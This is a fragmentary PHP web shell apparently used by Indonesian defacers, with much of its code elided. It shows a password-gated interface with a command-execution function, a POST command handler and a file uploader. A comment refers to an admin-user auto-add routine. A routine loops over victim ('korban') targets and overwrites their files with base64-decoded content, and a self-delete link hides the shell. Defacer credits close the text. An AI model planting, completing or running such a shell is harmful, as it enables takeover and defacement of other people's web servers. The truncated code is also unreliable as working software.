...
$xxx = "92b1b68daba39cf6fe2765d1e5f7dc33";///Your MD5 password
...
function w($dir,$perm) {
    if(!is_writable($dir)) {
        ...
        return "<font color=#00FFAE>".$perm."</font>";
    }
}
function exe($cmd) {
...
echo"<center><img src='http://knowafest.com/files/uploads/incognitologo-2018082508.png'width='200'height='200'><br>";
echo"<h1>Ngeue Kuy ???</h1>";
echo"<font size='3'>";
...
echo"<ul> <a href='?dir=$dir&saf=uplo'>Uploader</a></ul>";
...
echo "<ul> <a href='?dir=$dir&saf=406'>406 Tmp</a></ul><br><br>";
echo"</ul><br><br></pre>";
echo"</div><br>";
	if($_POST['do_cmd']) {
...
// Admin User Auto Add Coded By Mauritania Attacker recoded by Restu ID
...
?>
<form method="post">
<input type="submit" name="x" value="wp-config-sample.php">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
    foreach($target as $korban) {
        ...
        $isi_nama_doang = "";
        $decode_isi = base64_decode($isi_nama_doang);
        $encode = base64_encode($global);
        $ss = fopen($global,"w");
        fputs($ss, $decode_isi);
		...
		echo"resVh0st Indonesian Defacer<br>indoezcyber@gnail.com<br>Shell Ini Tidak sepenuh nya coding sendiri Ya Thanks to All<br>IndoXploit , N45HT , Con7ext, Author Brudul Shell,<br><li> <a href='?dir=$dir&kill=self'>HIDDEN</b></a></li></div><br>";
	...
	function Delete($path)
{
 ...
 echo "<form method='post'>
   ...
   echo "<center>Copyright @ ".date("Y")." -InDefacer</font></a></center>";
}
